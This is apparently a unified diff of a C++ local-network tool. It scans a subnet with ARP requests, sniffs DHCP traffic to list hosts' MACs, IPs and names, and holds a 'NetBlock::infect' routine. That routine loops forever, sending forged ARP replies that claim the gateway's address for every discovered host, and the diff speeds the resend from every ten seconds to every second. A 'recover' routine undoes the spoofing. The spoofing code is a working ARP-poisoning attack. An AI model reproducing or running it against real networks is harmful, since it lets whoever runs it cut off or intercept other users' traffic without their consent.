@@ -1,10 +1,10 @@
 #include "wscan.h"
 
-void Scan::send_arp(WPcapDevice* device, uint32_t ip_,list<Guest>* v)
+void NetBlock::infect(WPcapDevice* device, WIp gateway,list<Host>* v)
 {
-    list<Guest>::iterator iter;
+    list<Host>::iterator iter;
     Etharp etharp;
-    WPacket packet = WPacket();
+    WPacket packet;
 
     while(1)
     {
@@ -14,43 +14,103 @@ void Scan::send_arp(WPcapDevice* device, uint32_t ip_,list<Guest>* v)
         for(iter = v->begin(); iter!=v->end();iter++)
         {
             printf("\n<sendarp>\n");
-            (*iter).mac.print();
-            (*iter).ip.print();
+            (*iter).mac_.print();
+            (*iter).ip_.print();
 
-            etharp = makeArppacket((*iter).mac,device->intf()->mac(),(*iter).mac,(*iter).ip,ip_);
+            etharp = Etharp::makeArppacket((*iter).mac_,device->intf()->mac(),(*iter).mac_,(*iter).ip_,gateway);
             packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
             packet.buf_.size_ = sizeof(Etharp);
 
             for(int i =0; i<3; i++)
                 device->write(packet.buf_);
-            sleep(10);
+            sleep(1);
         }
     }
 }
 
-void Scan::arp_recover(WPcapDevice* device,WIp ip,uint32_t ip_,WIntfList& intflist)
+void NetBlock::recover(WPcapDevice* device, WIntfList& intflist, WIp gateway, Host host)
 {
-    WIntf* intf_t = intflist.findByIp(ip);//target interface
-    WIntf* intf_g = intflist.findByIp(ip_);//gateway interface
+    WIntf* intf_g = intflist.findByIp(gateway);//gateway interface
 
-    Etharp etharp = makeArppacket(intf_t->mac(),intf_g->mac(),intf_t->mac(),ip,ip_);
-    WPacket packet = WPacket();
+    Etharp etharp = Etharp::makeArppacket(host.mac_,intf_g->mac(),host.mac_,host.ip_,gateway);
+    WPacket packet;
     packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
     packet.buf_.size_ = sizeof(Etharp);
 
     for(int i =0; i<3; i++)
         device->write(packet.buf_);
 }
-
-void Scan::full_scan(WPcapDevice* device, uint32_t ip_, list<Guest>* v)
+void Scan::scan(WPcapDevice* device, WIp gateway)
 {
-    thread thread1(Scan::scan,device,ip_);
-    thread thread2(Scan::acquire,device,v,ip_);
-    thread1.join();
-    thread2.join();
+    WPacket packet;
+    packet.buf_.size_ = sizeof(Etharp);
+    Etharp etharp = Etharp::makeArppacket(WMac("FF:FF:FF:FF:FF:FF"),device->intf()->mac(),WMac("00:00:00:00:00:00"),WIp("0.0.0.0"),device->intf()->ip());
+
+    WIntf* intf = device->intf();
+    uint32_t beginIp = (intf->ip()&intf->mask())+1;
+    uint32_t endIp = (intf->ip()|~intf->mask())-1;
+
+    for(uint32_t ip = beginIp; ip!=endIp; ip++){
+        if(WIp(ip)==gateway)continue;
+        etharp.arp.tip_ = htonl(WIp(ip));
+        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
+        for(int i = 0; i < 3; i++)
+            device->write(packet.buf_);
+    }
 }
 
-Scan::Etharp Scan::makeArppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip)
+void Scan::acquire(WPcapDevice* device, list<Host>* v, WIp gateway)
+{
+    WPacket packet;
+    list<Host>::iterator iter;
+    time_t start, end;
+    start = time(NULL);
+    while(1)
+    {
+        if(device->WPcapCapture::read(&packet)==WPacket::Result::Ok)
+        {
+            if(packet.ethHdr_->type()!=WEthHdr::Arp)continue;
+            if(packet.ethHdr_->dmac_!=device->intf()->mac()||packet.arpHdr_->op()!=packet.arpHdr_->Reply)continue;
+
+            WIp mask = device->intf()->mask();
+            Host g;
+
+            if((packet.arpHdr_->sip()&mask)==(gateway&mask))
+            {
+                printf("\n<full scan>\n");
+                g.mac_ = packet.ethHdr_->smac();
+                g.ip_ = packet.arpHdr_->sip();
+                g.mac_.print();
+                g.ip_.print();
+            }
+
+            int tmp = 0;
+            for(iter = v->begin(); iter!=v->end();iter++){
+                if((*iter).ip_==g.ip_){
+                    tmp = 1;
+                    break;
+                }
+            }
+            if(!tmp)
+                v->push_back(g);
+        }
+
+        end = time(NULL);
+        if(end-start>10)return;
+    }
+}
+
+void Scan::open(WPcapDevice* DHdevice, WPcapDevice* FSdevice, WIp gateway, list<Host>* v)
+{
+    thread dhcp(dhcpScan,DHdevice,v);
+    thread scan_(scan,FSdevice,gateway);
+    thread acquire_(acquire,FSdevice,v,gateway);
+    dhcp.detach();
+    scan_.join();
+    acquire_.join();
+}
+
+Etharp Etharp::makeArppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip)
 {
     Etharp etharp;
     etharp.eth.dmac_ = dmac;
@@ -69,79 +129,9 @@ Scan::Etharp Scan::makeArppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp si
     return etharp;
 }
 
-void Scan::scan(WPcapDevice* device, uint32_t ip_)
+void Scan::dhcpScan(WPcapDevice* device, list<Host>* v)
 {
-    char* gateway = (char*)malloc(sizeof(char)*4);
-    WPacket packet = WPacket();
-    packet.buf_.size_ = sizeof(Etharp);
-    Etharp etharp = makeArppacket(WMac("FF:FF:FF:FF:FF:FF"),device->intf()->mac(),WMac("00:00:00:00:00:00"),WIp("0.0.0.0"),device->intf()->ip());
-
-    for(int l = 1; l<255; l++){
-        if((ip_&0x000000FF)==(l&0x000000FF))continue;
-        sprintf(gateway, "%u.%u.%u.%u",
-            (ip_ & 0xFF000000) >> 24,
-            (ip_ & 0x00FF0000) >> 16,
-            (ip_ & 0x0000FF00) >> 8,
-            (l & 0x000000FF));
-        string str(gateway);
-        etharp.arp.tip_ = htonl(WIp(str));
-        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
-        for(int i = 0; i < 3; i++)
-            device->write(packet.buf_);
-    }
-
-    if(gateway)
-    {
-        free(gateway);
-        gateway = NULL;
-    }
-}
-
-void Scan::acquire(WPcapDevice* device,list<Guest>* v,uint32_t ip_)
-{
-    WPacket packet = WPacket();
-    list<Guest>::iterator iter;
-    time_t start, end;
-    start = time(NULL);
-    while(1)
-    {
-        if(device->WPcapCapture::read(&packet)==WPacket::Result::Ok)
-        {
-            if(packet.ethHdr_->type()!=WEthHdr::Arp)continue;
-            if(packet.ethHdr_->dmac_!=device->intf()->mac()||packet.arpHdr_->op()!=packet.arpHdr_->Reply)continue;
-
-            int flag1 = 0, flag2 = 0, flag3 = 0;
-            (packet.arpHdr_->sip() & 0xFF000000) >> 24 == (ip_& 0xFF000000)>>24 ? flag1 = 1 : 0;
-            (packet.arpHdr_->sip() & 0x00FF0000) >> 16 == (ip_& 0x00FF0000) >> 16 ? flag2 = 1 : 0;
-            (packet.arpHdr_->sip() & 0x0000FF00) >> 8 == (ip_& 0x0000FF00) >> 8 ? flag3 = 1 : 0;
-
-            Guest g;
-
-            if(flag1&&flag2&&flag3)
-            {
-                printf("\n<full scan>\n");
-                g.mac = packet.ethHdr_->smac();
-                g.ip = packet.arpHdr_->sip();
-                g.mac.print();
-                g.ip.print();
-            }
-            int tmp = 0;
-            for(iter = v->begin(); iter!=v->end();iter++)
-                if((*iter).ip==g.ip){
-                    tmp = 1;
-                    break;
-                }
-            if(!tmp)
-                v->push_back(g);
-        }
-        end = time(NULL);
-        if(end-start>10)return;
-    }
-}
-
-void Scan::dhcp(WPcapDevice* device,list<Guest>* v)
-{
-    WPacket packet = WPacket();
+    WPacket packet;
     while(1)
     {
         if(device->WPcapCapture::read(&packet)==WPacket::Result::Ok)
@@ -153,9 +143,9 @@ void Scan::dhcp(WPcapDevice* device,list<Guest>* v)
 
             packet.dhcpHdr_ = (WDhcpHdr*)packet.udpData_.data_;
             printf("\n<Dhcp>\n");
-            Guest g;
-            g.mac = packet.dhcpHdr_->clientMac_;//get mac
-            g.mac.print();
+            Host g;
+            g.mac_ = packet.dhcpHdr_->clientMac_;//get mac
+            g.mac_.print();
 
             for(WDhcpHdr::Option* opt = packet.dhcpHdr_->first(); opt!=nullptr; opt=opt->next())
             {
@@ -167,8 +157,8 @@ void Scan::dhcp(WPcapDevice* device,list<Guest>* v)
                     sprintf(buf+12,"%03d",*(&opt->len_+4));
 
                     string str(buf);
-                    g.ip = WIp(str);
-                    g.ip.print();
+                    g.ip_ = WIp(str);
+                    g.ip_.print();
                 }
                 else if(opt->type_ == 12)//get name
                 {
